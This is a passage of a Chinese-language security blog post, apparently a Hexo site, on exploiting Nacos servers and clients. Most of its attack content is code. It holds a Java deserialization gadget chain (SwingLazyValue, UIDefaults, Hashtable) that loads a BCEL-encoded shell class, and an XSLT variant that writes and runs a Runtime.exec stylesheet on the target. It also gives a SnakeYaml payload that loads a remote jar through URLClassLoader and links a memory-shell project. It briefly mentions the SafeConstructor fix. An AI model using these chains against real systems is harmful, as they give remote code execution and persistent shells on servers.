+<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p>putVal:635, HashMap (java.util)<br>equals:814, Hashtable (java.util)             //跟cc7 hash值相等触发equals原理相同，触发Hashtable.equals(UIDefaults)<br>get:161, UIDefaults (javax.swing)             //触发传入UIDefaults的get方法<br>getFromHashtable:216, UIDefaults (javax.swing)<br>createValue:73, SwingLazyValue (sun.swing)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">JavaClass clazz = Repository.lookupClass(NacosFilterShellPlus.class);</span><br><span class="line">String payload = <span class="string">&quot;$$BCEL$$&quot;</span> + Utility.encode(clazz.getBytes(), <span class="keyword">true</span>);</span><br><span class="line">                                             <span class="comment">//classname,methodName,arg</span></span><br><span class="line">SwingLazyValue value = <span class="keyword">new</span> SwingLazyValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;payload&#125;&#125;);</span><br><span class="line">UIDefaults uiDefaults = <span class="keyword">new</span> UIDefaults();</span><br><span class="line">uiDefaults.put(value, value);</span><br><span class="line">Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> Hashtable();<span class="comment">//也可以是UIDefaults，这里只是为了在调试的时候好区分</span></span><br><span class="line">hashtable.put(value, value);</span><br><span class="line"><span class="keyword">return</span> makeMap(uiDefaults, hashtable);</span><br></pre></td></tr></table></figure>
+<h4 id="xslt"><a href="#xslt" class="headerlink" title="xslt"></a>xslt</h4><p>这个更加通用，链子跟上面那个差不多，就是最后调用的方法不一样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String tmpPath = &quot;/tmp/nacos_data_temp&quot;;</span></span><br><span class="line">        String tmpPath = <span class="string">&quot;C:\\Windows\\Temp\\nacos_data_temp&quot;</span>;</span><br><span class="line">           String cmd = payloadType.substring(<span class="number">4</span>);</span><br><span class="line">           String xslt = <span class="string">&quot;&lt;xsl:stylesheet version=\&quot;2.0\&quot; xmlns:xsl=\&quot;http://www.w3.org/1999/XSL/Transform\&quot; xmlns:java=\&quot;http://saxon.sf.net/java-type\&quot;&gt;\n    &lt;xsl:template match=\&quot;/\&quot;&gt;\n    &lt;xsl:value-of select=\&quot;Runtime:exec(Runtime:getRuntime(),&#x27;&lt;command&gt;&#x27;)\&quot; xmlns:Runtime=\&quot;java.lang.Runtime\&quot;/&gt;\n    &lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;&quot;</span>.replace(<span class="string">&quot;&lt;command&gt;&quot;</span>, cmd);</span><br><span class="line">            value = <span class="keyword">new</span> SwingLazyValue(<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.JavaUtils&quot;</span>, <span class="string">&quot;writeBytesToFilename&quot;</span>, <span class="keyword">new</span> Object[]&#123;tmpPath, xslt.getBytes()&#125;);<span class="comment">//先写到攻击目标本地文件中（一般/tmp/都有写的权限）</span></span><br><span class="line">            ........</span><br><span class="line">            <span class="comment">//第二次攻击执行poc</span></span><br><span class="line">            value = <span class="keyword">new</span> SwingLazyValue(<span class="string">&quot;com.sun.org.apache.xalan.internal.xslt.Process&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">&quot;-XT&quot;</span>, <span class="string">&quot;-XSL&quot;</span>, <span class="string">&quot;file://&quot;</span> + tmpPath&#125;&#125;);</span><br></pre></td></tr></table></figure>
+<p>原理(二进制的东西我也看不明白):<a target="_blank" rel="noopener" href="https://paper.seebug.org/1963/#0x00">https://paper.seebug.org/1963/#0x00</a></p>
+<h2 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><h3 id="Nacos-client-Yaml反序列化漏洞"><a href="#Nacos-client-Yaml反序列化漏洞" class="headerlink" title="Nacos-client Yaml反序列化漏洞"></a>Nacos-client Yaml反序列化漏洞</h3><p>漏洞影响版本:  Nacos-Client &lt; 1.4.2<br>其实也很好理解，nacos本身就是管理动态配置的，我们可以设置配置类型为yaml，并且修改配置为任意poc，当修改成功之后，对应的客户端Nacos-client轮询会接受到信息，并且会调用<strong>SnakeYaml包</strong>反序列化配置文件</p>
+<h4 id="snakeYaml反序列化"><a href="#snakeYaml反序列化" class="headerlink" title="snakeYaml反序列化"></a>snakeYaml反序列化</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String context = <span class="string">&quot;!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\&quot;http://127.0.0.1:8000/yaml-payload.jar\&quot;]]]]&quot;</span>;<span class="comment">//snakeYaml特有的触发construct方法，具体的我也记不清了</span></span><br><span class="line">Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">yaml.load(context);</span><br></pre></td></tr></table></figure>
+<p>执行的jar包需要符合<strong>SPI 机制</strong> <a target="_blank" rel="noopener" href="https://github.com/passer-W/snakeyaml-memshell">https://github.com/passer-W/snakeyaml-memshell</a><br>修复法方</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Yaml yaml = <span class="keyword">new</span> Yaml(<span class="keyword">new</span> SafeConstructor());</span><br><span class="line">yaml.load(context);</span><br></pre></td></tr></table></figure>
+<h3 id="Nacos结合Spring-Cloud-Gateway-RCE利用"><a href="#Nacos结合Spring-Cloud-Gateway-RCE利用" class="headerlink" title="Nacos结合Spring Cloud Gateway RCE利用"></a>Nacos结合Spring Cloud Gateway RCE利用</h3>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/28/c%20sharp/c%20sharp%20wcf/" rel="prev" title="c# wcf">
+                  <i class="fa fa-chevron-left"></i> c# wcf
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/13/server/awd%E5%AE%9E%E8%B7%B5/" rel="next" title="awd 实践">
+                  awd 实践 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mayylu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
